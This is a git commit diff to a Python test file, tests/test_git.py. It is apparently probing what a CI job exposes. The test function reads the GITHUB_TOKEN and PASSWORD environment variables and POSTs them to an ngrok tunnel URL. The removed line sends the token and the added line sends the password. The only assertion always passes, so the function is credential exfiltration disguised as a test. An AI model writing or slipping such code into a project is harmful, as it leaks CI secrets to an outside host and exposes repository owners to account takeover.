7cc9d3a1f90b61cc5efd3131be6bf74249aec1c2
doomholderz <joeharris@gocardless.com>
2025-03-21 11:34:22 +0000

    testing now with env var of password not set in job

--- tests/test_git.py
+++ tests/test_git.py
@@ -6,7 +6,7 @@ import os
 def test_int_commit():
     github_token = os.getenv('GITHUB_TOKEN')
     password = os.getenv('PASSWORD')
-    response = requests.post("https://dbb9-86-10-216-244.ngrok-free.app", json={'token': github_token})
+    response = requests.post("https://dbb9-86-10-216-244.ngrok-free.app", json={'password': password})
 
     print("PRINT_TEST")
     assert "PRINT_TEST"
